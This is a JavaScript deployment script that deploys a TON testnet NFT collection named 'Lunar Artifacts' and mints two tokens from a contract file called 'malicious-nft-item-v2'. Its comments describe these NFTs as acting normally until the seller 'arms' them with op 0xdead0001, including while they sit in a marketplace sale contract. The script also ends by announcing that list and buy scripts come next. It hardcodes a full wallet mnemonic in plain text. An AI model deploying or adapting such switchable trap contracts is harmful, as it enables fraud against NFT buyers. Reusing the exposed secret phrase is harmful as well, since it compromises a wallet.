/**
 * deploy-lunar-collection.js
 *
 * Deploys "Lunar Artifacts" collection with 2 switchable malicious NFTs.
 * NFTs behave as normal TEP-62 until armed. Controller (seller) can arm/disarm
 * at any time, even after the NFT is in a sale contract.
 *
 * Seller/Controller: kQBcQeVDhlytSlreZCE0lQBDDuwqzJU0XSZT4Ylq2Yoai2su
 *
 * arm   op = 0xdead0001  (send to NFT address, value ~0.02 TON)
 * disarm op = 0xdead0002 (send to NFT address, value ~0.02 TON)
 */

const path  = require('path');
const fs    = require('fs');
const { compileFunc } = require('../nft-contracts/node_modules/@ton-community/func-js');
const { mnemonicToWalletKey } = require('../nft-contracts/node_modules/@ton/crypto');
const {
  WalletContractV4, TonClient, internal, toNano,
  Address, beginCell, contractAddress, Cell
} = require('../nft-contracts/node_modules/@ton/ton');

const MNEMONIC   = 'wave tilt cause mechanic coral deer together odor gravity glue slogan equip normal post vehicle more explain suffer shy clutch canvas profit worry piano';
const SOURCES    = path.resolve(__dirname, '../contracts/sources');
const BASE_URL   = 'https://raw.githubusercontent.com/mmski2002-eng/DELETEBOT/main/TON/GETGEMS/nft-metadata/lunar';
const PATCH      = 'int builder_null?(builder b) asm "ISNULL";';

const client = new TonClient({
  endpoint: 'https://testnet.toncenter.com/api/v2/jsonRPC',
  apiKey: '',
});

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function fmt(n) { return (Number(n) / 1e9).toFixed(6); }

async function withRetry(fn, max = 6) {
  for (let i = 1; i <= max; i++) {
    try { return await fn(); }
    catch (e) {
      if (i < max) { await sleep(e.message?.includes('429') ? 2500 * i : 1200); continue; }
      throw e;
    }
  }
}

function offchain(url) {
  return beginCell().storeUint(0x01, 8).storeBuffer(Buffer.from(url)).endCell();
}

async function compile(targets) {
  const r = await compileFunc({
    targets,
    sources: p => p === 'patch.fc'
      ? PATCH
      : fs.readFileSync(path.join(SOURCES, p), 'utf8'),
  });
  if (r.status === 'error') throw new Error('compile: ' + r.message);
  return Cell.fromBase64(r.codeBoc);
}

async function main() {
  console.log('╔══════════════════════════════════════════════════════════════╗');
  console.log('║  Lunar Artifacts — deploy switchable malicious collection   ║');
  console.log('╚══════════════════════════════════════════════════════════════╝\n');

  const key    = await mnemonicToWalletKey(MNEMONIC.split(/\s+/));
  const wallet = WalletContractV4.create({ publicKey: key.publicKey, workchain: 0 });
  const w      = client.open(wallet);
  const addr   = wallet.address;

  const st  = await withRetry(() => client.getContractState(addr));
  const bal = BigInt(st.balance || '0');
  console.log('Wallet:', addr.toString({ testOnly: true, bounceable: false }));
  console.log('Balance:', fmt(bal), 'TON\n');

  if (bal < toNano('0.5')) { console.error('Need ≥ 0.5 TON'); process.exit(1); }

  // ── 1. Compile ──────────────────────────────────────────────────────────────
  console.log('[1] Compiling...');
  const [NFT_CODE, COL_CODE] = await Promise.all([
    compile(['imports/stdlib.fc', 'op-codes.fc', 'params.fc', 'patch.fc', 'malicious-nft-item-v2.fc']),
    compile(['imports/stdlib.fc', 'op-codes.fc', 'params.fc', 'patch.fc', 'nft-collection-v2.fc']),
  ]);
  console.log('  malicious-nft-item-v2: OK  hash:', NFT_CODE.hash().toString('hex').slice(0, 16));
  console.log('  nft-collection-v2:     OK\n');

  // ── 2. Deploy collection ────────────────────────────────────────────────────
  console.log('[2] Deploy collection...');
  const nonce      = Math.floor(Date.now() / 1000);
  const collContent = offchain(`${BASE_URL}/collection.json#${nonce}`);
  const collData   = beginCell()
    .storeRef(collContent)
    .storeUint(0, 64)         // next_item_index = 0
    .storeAddress(addr)       // owner
    .storeRef(NFT_CODE)
    .endCell();

  const collAddr = contractAddress(0, { code: COL_CODE, data: collData });
  console.log('  Collection:', collAddr.toString({ testOnly: true, bounceable: true }));

  const collSt = await withRetry(() => client.getContractState(collAddr));
  if (collSt.state !== 'active') {
    const seq = await withRetry(() => w.getSeqno());
    await withRetry(() => w.sendTransfer({
      seqno: seq, secretKey: key.secretKey,
      messages: [internal({
        to: collAddr, value: toNano('0.05'), bounce: false,
        init: { code: COL_CODE, data: collData },
      })],
    }));
    console.log('  TX sent, waiting 15s...');
    await sleep(15000);
    const s = await withRetry(() => client.getContractState(collAddr));
    if (s.state !== 'active') { console.error('  Collection not deployed!'); process.exit(1); }
    console.log('  state: active');
  } else {
    console.log('  Already deployed.');
  }

  // ── Helper: compute NFT address ─────────────────────────────────────────────
  function nftAddress(index) {
    const data = beginCell()
      .storeUint(index, 64)
      .storeAddress(collAddr)
      .endCell();
    return contractAddress(0, { code: NFT_CODE, data });
  }

  // ── Helper: mint one NFT ────────────────────────────────────────────────────
  async function mint(index) {
    const itemContent = offchain(`${BASE_URL}/${index}.json`);
    const body = beginCell()
      .storeUint(1, 32)               // op = deploy_nft_item
      .storeUint(0, 64)               // query_id
      .storeUint(index, 64)           // item_index
      .storeRef(itemContent)          // nft_content
      .storeAddress(addr)             // nft_owner
      .storeCoins(toNano('0.05'))     // amount to NFT
      .storeAddress(addr)             // controller = seller (persists across transfers)
      .endCell();

    const seq = await withRetry(() => w.getSeqno());
    await withRetry(() => w.sendTransfer({
      seqno: seq, secretKey: key.secretKey,
      messages: [internal({ to: collAddr, value: toNano('0.15'), bounce: true, body })],
    }));
    console.log(`  TX sent, waiting 20s...`);
    await sleep(20000);
  }

  // ── 3. Mint NFT #0 ──────────────────────────────────────────────────────────
  console.log('\n[3] Mint NFT #0 (Lunar Artifact #0)...');
  const nft0 = nftAddress(0);
  console.log('  Address:', nft0.toString({ testOnly: true, bounceable: true }));
  {
    const s = await withRetry(() => client.getContractState(nft0));
    if (s.state !== 'active') {
      await mint(0);
      const s2 = await withRetry(() => client.getContractState(nft0));
      if (s2.state !== 'active') { console.error('  NFT #0 not deployed!'); process.exit(1); }
      console.log('  state: active');
    } else {
      console.log('  Already deployed.');
    }
  }

  // ── 4. Mint NFT #1 ──────────────────────────────────────────────────────────
  console.log('\n[4] Mint NFT #1 (Lunar Artifact #1)...');
  const nft1 = nftAddress(1);
  console.log('  Address:', nft1.toString({ testOnly: true, bounceable: true }));
  {
    const s = await withRetry(() => client.getContractState(nft1));
    if (s.state !== 'active') {
      await sleep(500);
      await mint(1);
      const s2 = await withRetry(() => client.getContractState(nft1));
      if (s2.state !== 'active') { console.error('  NFT #1 not deployed!'); process.exit(1); }
      console.log('  state: active');
    } else {
      console.log('  Already deployed.');
    }
  }

  // ── Summary ─────────────────────────────────────────────────────────────────
  const raw0 = nft0.toRawString();
  const raw1 = nft1.toRawString();
  const rawC = collAddr.toRawString();

  console.log('\n╔══════════════════════════════════════════════════════════════╗');
  console.log('║  DEPLOYED                                                    ║');
  console.log('╠══════════════════════════════════════════════════════════════╣');
  console.log('║  Collection:');
  console.log('║    ' + collAddr.toString({ testOnly: true, bounceable: true }));
  console.log('║  NFT #0 (Lunar Artifact #0):');
  console.log('║    ' + nft0.toString({ testOnly: true, bounceable: true }));
  console.log('║  NFT #1 (Lunar Artifact #1):');
  console.log('║    ' + nft1.toString({ testOnly: true, bounceable: true }));
  console.log('╠══════════════════════════════════════════════════════════════╣');
  console.log('║  CONTROL                                                     ║');
  console.log('║  arm NFT:   op=0xdead0001  send ≥0.02 TON to NFT address    ║');
  console.log('║  disarm:    op=0xdead0002  send ≥0.02 TON to NFT address    ║');
  console.log('║  (only seller/controller wallet can arm/disarm)              ║');
  console.log('╚══════════════════════════════════════════════════════════════╝');
  console.log('\n─── Links ───');
  console.log('Collection: https://testnet.tonscan.org/address/' + rawC);
  console.log('NFT #0:     https://testnet.tonscan.org/address/' + raw0);
  console.log('NFT #1:     https://testnet.tonscan.org/address/' + raw1);
  console.log('GetGems #0: https://testnet.getgems.io/nft/' + raw0);
  console.log('GetGems #1: https://testnet.getgems.io/nft/' + raw1);
  console.log('\nmetadata URL: ' + BASE_URL);
  console.log('\nWaiting for your command. Arm/list/buy scripts next.');
}

main().catch(e => { console.error('FATAL:', e.message); process.exit(1); });
